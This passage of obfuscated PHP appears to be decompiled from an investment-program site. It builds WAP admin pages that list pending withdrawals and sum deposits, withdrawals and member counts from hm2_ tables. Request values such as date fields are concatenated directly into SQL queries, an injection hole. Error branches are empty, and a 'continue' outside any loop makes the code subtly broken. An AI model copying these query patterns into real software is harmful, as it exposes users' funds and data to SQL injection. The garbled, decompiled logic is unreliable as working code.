    $elnlcjucT = "'".$elnlcCIQT[$elnlcNjKgR['elnlcyvld']]."-".$elnlcCIQT[$elnlcNjKgR['elnlcsdmu']]."-".$elnlcCIQT[$elnlcNjKgR['elnlcOEimP']]."' + interval 0 day < date + interval ".$elnlccQgz[$elnlcNjKgR['elnlcxhrRS']]." hour and "."'".$elnlcCIQT[$elnlcNjKgR['elnlcWVkP']]."-".$elnlcCIQT[$elnlcNjKgR['elnlcEHSgQ']]."-".$elnlcCIQT[$elnlcNjKgR['elnlcRlONl']]."' + interval 1 day > date + interval ".$elnlccQgz[$elnlcNjKgR['elnlcxhrRS']]." hour ";
    $q = "select count(*) as call1 from hm2_history where {$elnlcjucT} {$elnlcPhbhn} and user_id = {$elnlcstVj}";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcRsuU = $elnlcELue[$elnlcNjKgR['elnlccOOGy']];
    $elnlcdrwO = $elnlcCIQT[$elnlcNjKgR['elnlctUbz']];
    $elnlcBxzV = $elnlcNjKgR['elnlcKfGwO'];
    $elnlcKhsVN = ceil( $elnlcRsuU / $elnlcBxzV );
    if ( $elnlcdrwO <= 1 )
    {
        $elnlcdrwO = $elnlcNjKgR['elnlcqGMK'];
    }
    if ( $elnlcKhsVN < $elnlcdrwO && 1 < $elnlcKhsVN )
    {
        $elnlcdrwO = $elnlcKhsVN;
    }
    $elnlcGmGw = ( $elnlcdrwO - 1 ) * $elnlcBxzV;
    $q = "select *, date_format(date + interval ".$elnlccQgz[$elnlcNjKgR['elnlcxhrRS']]." hour, '%b-%e-%Y %r') as d from hm2_history where {$elnlcjucT} {$elnlcPhbhn} and user_id = {$elnlcstVj} order by date desc, id desc limit {$elnlcGmGw}, {$elnlcBxzV}";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcaaLV = array( );
    while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
    {
        $elnlcELue[$elnlcNjKgR['elnlcHzazG']] = $elnlcJtrz[$elnlcELue[$elnlcNjKgR['elnlcAvSAt']]];
        $elnlcELue[$elnlcNjKgR['elnlcHMum']] = number_format( abs( $elnlcELue[$elnlcNjKgR['elnlcHMum']] ), 2 );
        array_push( $elnlcaaLV, $elnlcELue );
    }
    $elnlciNQPP = array( );
    $i = $elnlcNjKgR['elnlcqGMK'];
    for ( ; $i <= $elnlcKhsVN; ++$i )
    {
        $elnlcaxvw = array( );
        $elnlcaxvw[$elnlcNjKgR['elnlctUbz']] = $i;
        $elnlcaxvw[$elnlcNjKgR['elnlcahKjJ']] = $i == $elnlcdrwO ? 1 : 0;
        array_push( $elnlciNQPP, $elnlcaxvw );
    }
    $elnlcIdMx->assign( "pages", $elnlciNQPP );
    $elnlcIdMx->assign( "colpages", $elnlcKhsVN );
    $elnlcIdMx->assign( "current_page", $elnlcdrwO );
    if ( 1 < $elnlcdrwO )
    {
        $elnlcIdMx->assign( "prev_page", $elnlcdrwO - 1 );
    }
    if ( $elnlcdrwO < $elnlcKhsVN )
    {
        $elnlcIdMx->assign( "next_page", $elnlcdrwO + 1 );
    }
    $q = "select sum(actual_amount) as sum from hm2_history where {$elnlcjucT} and user_id = {$elnlcstVj} {$elnlcPhbhn}";
    $elnlccfAC = mysql_query( $q );
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcmkPm = $elnlcELue[$elnlcNjKgR['elnlcnSgK']];
    $elnlcIdMx->assign( "periodsum", number_format( $elnlcmkPm, 2 ) );
    $q = "select sum(actual_amount) as sum from hm2_history where user_id = {$elnlcstVj} {$elnlcPhbhn}";
    $elnlccfAC = mysql_query( $q );
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcqTdP = $elnlcELue[$elnlcNjKgR['elnlcnSgK']];
    $elnlcIdMx->assign( "allsum", number_format( $elnlcqTdP, 2 ) );
    $elnlcCbHR = array( "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", $elnlcNjKgR['elnlcFGJpf'] );
    $elnlcIdMx->assign( "month", $elnlcCbHR );
    $elnlcyzJk = array( );
    $i = $elnlcNjKgR['elnlcqGMK'];
    for ( ; $i <= 31; ++$i )
    {
        array_push( $elnlcyzJk, $i );
    }
    $elnlcIdMx->assign( "day", $elnlcyzJk );
    $elnlcMvsA = array( );
    $i = $elnlccQgz[$elnlcNjKgR['elnlcBbIJC']];
    for ( ; $i <= date( "Y", time( ) + $elnlccQgz[$elnlcNjKgR['elnlcxhrRS']] * 60 * 60 ); ++$i )
    {
        array_push( $elnlcMvsA, $i );
    }
    $elnlcIdMx->assign( "year", $elnlcMvsA );
    $elnlcIdMx->assign( "trans", $elnlcaaLV );
    $elnlcIdMx->assign( "qtrans", sizeof( $elnlcaaLV ) );
    $elnlcIdMx->assign( "frm", $elnlcCIQT );
    $elnlcIdMx->display( $elnlcNjKgR['elnlcfyjT'] );
    print base64_decode( "Cg==\r\n" );
}
else if ( $elnlcCIQT[$elnlcNjKgR['elnlcOLvrv']] == $elnlcNjKgR['elnlcRsSqM'] && $elnlcLcnC[$elnlcNjKgR['elnlcohjn']] == 1 )
{
    header( "Content-type: text/vnd.wap.wml" );
    print "<?xml version=\"1.0\"?>";
    print base64_decode( "CjwhRE9DVFlQRSB3bWwgUFVCTElDICItLy9XQVBGT1JVTS8vRFREIFdNTCAxLjEvL0VOIiAiaHR0\r\ncDovL3d3dy53YXBmb3J1bS5vcmcvRFREL3dtbF8xLjEueG1sIj4KCjx3bWw+CjxjYXJkIHRpdGxl\r\nPSJQZW5kaW5nIHdpdGhkcmF3Ij4KPHA+Cg==\r\n" );
    if ( $elnlcCIQT[$elnlcNjKgR['elnlcywcab']] != "" )
    {
        $elnlcPhbhn = " and type='withdraw_pending' ";
    }
    $q = "select count(*) as col from hm2_history where type='withdraw_pending'";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcRsuU = $elnlcELue[$elnlcNjKgR['elnlcmzAk']];
    $elnlcdrwO = $elnlcCIQT[$elnlcNjKgR['elnlctUbz']];
    $elnlcBxzV = $elnlcNjKgR['elnlcKfGwO'];
    $elnlcKhsVN = ceil( $elnlcRsuU / $elnlcBxzV );
    if ( $elnlcdrwO <= 1 )
    {
        $elnlcdrwO = $elnlcNjKgR['elnlcqGMK'];
    }
    if ( $elnlcKhsVN < $elnlcdrwO && 1 < $elnlcKhsVN )
    {
        $elnlcdrwO = $elnlcKhsVN;
    }
    $elnlcGmGw = ( $elnlcdrwO - 1 ) * $elnlcBxzV;
    $q = "select *, date_format(date + interval ".$elnlccQgz[$elnlcNjKgR['elnlcxhrRS']]." hour, '%b-%e-%Y %r') as d from hm2_history where type='withdraw_pending' order by date desc, id desc limit {$elnlcGmGw}, {$elnlcBxzV}";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcaaLV = array( );
    while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
    {
        $q = "select username from hm2_users where id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']];
        $elnlcqBcqg = mysql_query( $q );
        $elnlcChoo = mysql_fetch_array( $elnlcqBcqg );
        if ( $elnlcChoo )
        {
            $elnlcELue[$elnlcNjKgR['elnlcikTzy']] = $elnlcChoo[$elnlcNjKgR['elnlcikTzy']];
        }
        else
        {
            $elnlcELue[$elnlcNjKgR['elnlcikTzy']] = "-- deleted user --";
        }
        array_push( $elnlcaaLV, $elnlcELue );
    }
    $elnlcCbHR = array( "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", $elnlcNjKgR['elnlcFGJpf'] );
    $q = "select sum(actual_amount) as periodsum from hm2_history where type='withdraw_pending'";
    $elnlccfAC = mysql_query( $q );
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcmkPm = $elnlcELue[$elnlcNjKgR['elnlcvEszx']];
    $q = "select sum(actual_amount) as sum from hm2_history where type='withdraw_pending'";
    $elnlccfAC = mysql_query( $q );
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcqTdP = $elnlcELue[$elnlcNjKgR['elnlcnSgK']];
    print base64_decode( "Cgo8Yj5QZW5kaW5nIFdpdGhkcmF3YWw8L2I+PGJyLz48YnIvPgoK\r\n" );
    if ( 0 < sizeof( $elnlcaaLV ) )
    {
        $i = $elnlcNjKgR['elnlcuSFVu'];
        for ( ; $i < sizeof( $elnlcaaLV ); ++$i )
        {
            print base64_decode( "CjxiPg==\r\n" );
            print $elnlcaaLV[$i][$elnlcNjKgR['elnlcikTzy']];
            print base64_decode( "PC9iPiAmbmJzcDsgJA==\r\n" );
            print number_format( abs( $elnlcaaLV[$i][$elnlcNjKgR['elnlcHMum']] ), 2 );
            print base64_decode( "CiZuYnNwOyA8c21hbGw+\r\n" );
            print $elnlcaaLV[$i][$elnlcNjKgR['elnlcQCOo']];
            print base64_decode( "PC9zbWFsbD48YnIvPgo=\r\n" );
            print $elnlcaaLV[$i][$elnlcNjKgR['elnlcflIer']];
            print base64_decode( "PGJyLz48YnIvPgo=\r\n" );
        }
        continue;
    }
    else
    {
        print base64_decode( "Ck5vIHRyYW5zYWN0aW9ucyBmb3VuZDxici8+Cg==\r\n" );
    }
    print base64_decode( "CjxiPlRvdGFsIGZvciBhbGwgdGltZTo8L2I+ICZuYnNwOyQg\r\n" );
    print number_format( ( $elnlcCIQT[$elnlcNjKgR['elnlcywcab']] == $elnlcNjKgR['elnlcLIUV'] || $elnlcCIQT[$elnlcNjKgR['elnlcywcab']] == $elnlcNjKgR['elnlcrGMKd'] ? "-1" : "1" ) * $elnlcqTdP, 2 );
    print base64_decode( "Cjxici8+CjwhLS0KPGNlbnRlcj4K\r\n" );
    if ( 1 < $elnlcKhsVN )
    {
        $i = $elnlcNjKgR['elnlcqGMK'];
        for ( ; $i <= $elnlcKhsVN; ++$i )
        {
            if ( $i == $elnlcdrwO )
            {
                print base64_decode( "CiAgIA==\r\n" );
                print $i;
                print base64_decode( "Cg==\r\n" );
            }
            else
            {
                print base64_decode( "CiAgIDxhIGhyZWY9ImphdmFzY3JpcHQ6Z28oJw==\r\n" );
                print $i;
                print base64_decode( "JykiPg==\r\n" );
                print $i;
                print base64_decode( "PC9hPgo=\r\n" );
            }
        }
    }
    print base64_decode( "CjwvY2VudGVyPgotLT4KPGJyLz4KPGEgaHJlZj0iP2E9YWRtaW5fbWFpbiI+R2xvYmFsIFN0YXRz\r\nPC9hPjxici8+CjxhIGhyZWY9Ij9hPWxvZ291dCI+TG9nb3V0PC9hPgoKPC9wPgo8L2NhcmQ+Cjwv\r\nd21sPgo=\r\n" );
}
else if ( $elnlcLcnC[$elnlcNjKgR['elnlcohjn']] == 1 )
{
    header( "Content-type: text/vnd.wap.wml" );
    print "<?xml version=\"1.0\"?>";
    print base64_decode( "CjwhRE9DVFlQRSB3bWwgUFVCTElDICItLy9XQVBGT1JVTS8vRFREIFdNTCAxLjEvL0VOIiAiaHR0\r\ncDovL3d3dy53YXBmb3J1bS5vcmcvRFREL3dtbF8xLjEueG1sIj4KCjx3bWw+CjxjYXJkIHRpdGxl\r\nPSJHbG9iYWwgU3RhdGlzdGljcyI+CjxwPgo=\r\n" );
    $q = "select sum(actual_amount) as col from hm2_history where type='add_funds' and to_days(now()) = to_days(date)";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcMhUwk[$elnlcNjKgR['elnlcgxHK']] = abs( $elnlcELue[$elnlcNjKgR['elnlcmzAk']] );
    $q = "select sum(actual_amount) as col from hm2_history where type='withdrawal' and to_days(now()) = to_days(date)";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcMCLM[$elnlcNjKgR['elnlcgxHK']] = abs( $elnlcELue[$elnlcNjKgR['elnlcmzAk']] );
    $q = "select sum(actual_amount) as col from hm2_history where type='add_funds' and yearweek(now()) = yearweek(date)";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcMhUwk[$elnlcNjKgR['elnlctgJO']] = abs( $elnlcELue[$elnlcNjKgR['elnlcmzAk']] );
    $q = "select sum(actual_amount) as col from hm2_history where type='withdrawal' and yearweek(now()) = yearweek(date)";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcMCLM[$elnlcNjKgR['elnlctgJO']] = abs( $elnlcELue[$elnlcNjKgR['elnlcmzAk']] );
    $q = "select sum(actual_amount) as col from hm2_history where type='add_funds' and EXTRACT(YEAR_MONTH FROM now()) = EXTRACT(YEAR_MONTH FROM date)";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcMhUwk[$elnlcNjKgR['elnlcWkOBU']] = abs( $elnlcELue[$elnlcNjKgR['elnlcmzAk']] );
    $q = "select sum(actual_amount) as col from hm2_history where type='withdrawal' and EXTRACT(YEAR_MONTH FROM now()) = EXTRACT(YEAR_MONTH FROM date)";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcMCLM[$elnlcNjKgR['elnlcWkOBU']] = abs( $elnlcELue[$elnlcNjKgR['elnlcmzAk']] );
    $q = "select sum(actual_amount) as col from hm2_history where type='add_funds' and year(now()) = year(date)";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcMhUwk[$elnlcNjKgR['elnlcDvWNx']] = abs( $elnlcELue[$elnlcNjKgR['elnlcmzAk']] );
    $q = "select sum(actual_amount) as col from hm2_history where type='withdrawal' and year(now()) = year(date)";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcMCLM[$elnlcNjKgR['elnlcDvWNx']] = abs( $elnlcELue[$elnlcNjKgR['elnlcmzAk']] );
    $q = "select sum(actual_amount) as col from hm2_history where type='add_funds'";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcMhUwk[$elnlcNjKgR['elnlcjBNOD']] = abs( $elnlcELue[$elnlcNjKgR['elnlcmzAk']] );
    $q = "select sum(actual_amount) as col from hm2_history where type='withdrawal'";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcMCLM[$elnlcNjKgR['elnlcjBNOD']] = abs( $elnlcELue[$elnlcNjKgR['elnlcmzAk']] );
    $q = "select count(*) as col from hm2_users where id <> 1";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcUDEm = $elnlcELue[$elnlcNjKgR['elnlcmzAk']];
    $q = "select count(distinct user_id) as col from hm2_deposits";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlctTLnm = $elnlcELue[$elnlcNjKgR['elnlcmzAk']];
    $q = "select count(*) as col from hm2_users where id <> 1 and status = 'on'";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcRDtN = $elnlcELue[$elnlcNjKgR['elnlcmzAk']];
    $q = "select sum(status = 'on') as col1, count(*) as col2 from hm2_types";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcGScj = $elnlcELue[$elnlcNjKgR['elnlcWjmJI']];
    $elnlcoOKs = $elnlcELue[$elnlcNjKgR['elnlcVVbI']];
    $q = "select sum(actual_amount) as col from hm2_history";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlctWmyA = $elnlcELue[$elnlcNjKgR['elnlcmzAk']];
    $q = "select sum(actual_amount) as col from hm2_deposits";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlczseCe = $elnlcELue[$elnlcNjKgR['elnlcmzAk']];
    $q = "select sum(actual_amount) as col from hm2_deposits where status='on'";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcjCCHR = $elnlcELue[$elnlcNjKgR['elnlcmzAk']];
    $q = "select sum(actual_amount) as col from hm2_history where type='withdrawal'";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcxQTrA = $elnlcELue[$elnlcNjKgR['elnlcmzAk']];
    $q = "select sum(actual_amount) as col from hm2_history where type='withdraw_pending'";
    if ( !( $elnlccfAC = mysql_query( $q ) ) )
    {
    }
    $elnlcELue = mysql_fetch_array( $elnlccfAC );
    $elnlcnuLOV = abs( $elnlcELue[$elnlcNjKgR['elnlcmzAk']] );
    print base64_decode( "Cgo8Yj5HbG9iYWwgU3RhdGlzdGljczo8L2I+PGJyLz4KTWVtYmVyczogCglBbGw6IA==\r\n" );
    print $elnlcUDEm;
    print base64_decode( "LCAKCUFjdGl2ZSA=\r\n" );
    print $elnlcRDtN;
    print base64_decode( "LCAKCURpc2FibGVkIA==\r\n" );
    print $elnlcUDEm - $elnlcRDtN;
    print base64_decode( $elnlcNjKgR['elnlcCicAM'] );
    print $elnlctTLnm;
    print base64_decode( $elnlcNjKgR['elnlcRhgEW'] );
    print $elnlcUDEm - $elnlctTLnm;
    print base64_decode( "PGJyLz4KPGJyLz4KSW52ZXN0bWVudCBQYWNrYWdlczoKCUFjdGl2ZSA=\r\n" );
    print $elnlcGScj;
    print base64_decode( $elnlcNjKgR['elnlcyOveG'] );
    print $elnlcoOKs - $elnlcGScj;
    print base64_decode( $elnlcNjKgR['elnlcmdhH'] );
    print number_format( $elnlcMhUwk[$elnlcNjKgR['elnlcjBNOD']] - $elnlcMCLM[$elnlcNjKgR['elnlcjBNOD']], 2 );
    print base64_decode( $elnlcNjKgR['elnlcNxcI'] );
    print number_format( $elnlctWmyA, 2 );
    print base64_decode( $elnlcNjKgR['elnlczVQp'] );
    print number_format( $elnlczseCe, 2 );
    print base64_decode( "PGJyLz4KQ3VycmVudCBkZXBvc2l0IG9mIE1lbWJlcnM6ICQ=\r\n" );
    print number_format( $elnlcjCCHR, 2 );
    print base64_decode( "PGJyLz4KCjxici8+ClRvdGFsIHdpdGhkcmF3OiAk\r\n" );
    print number_format( 0 - $elnlcxQTrA, 2 );
    print base64_decode( "PGJyLz4KUGVuZGluZyB3aXRoZHJhdzogJA==\r\n" );
    print number_format( $elnlcnuLOV, 2 );
    print base64_decode( "PGJyLz4KPGJyLz4KPGEgaHJlZj0iP2E9YWRtaW5fcGVuZGluZyI+UGVuZGluZyBXaXRoZHJhdzwv\r\nYT48YnIvPgo8YSBocmVmPSI/YT1sb2dvdXQiPkxvZ291dDwvYT4KPC9wPgo8L2NhcmQ+Cjwvd21s\r\nPgo=\r\n" );
    elnlchxce( $elnlcyBRd );
    exit( );
}
else
{
    header( "Content-type: text/vnd.wap.wml" );
    $q = "select max(percent) as percent from hm2_referal";
    $elnlccfAC = mysql_query( $q );
    while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
    {
        $elnlcIdMx->assign( "percent", $elnlcELue[$elnlcNjKgR['elnlcLDncy']] );
    }
    $elnlcIdMx->display( $elnlcNjKgR['elnlcwDcQh'] );
    elnlchxce( $elnlcyBRd );
    exit( );
}
elnlchxce( $elnlcyBRd );
exit( );
?>
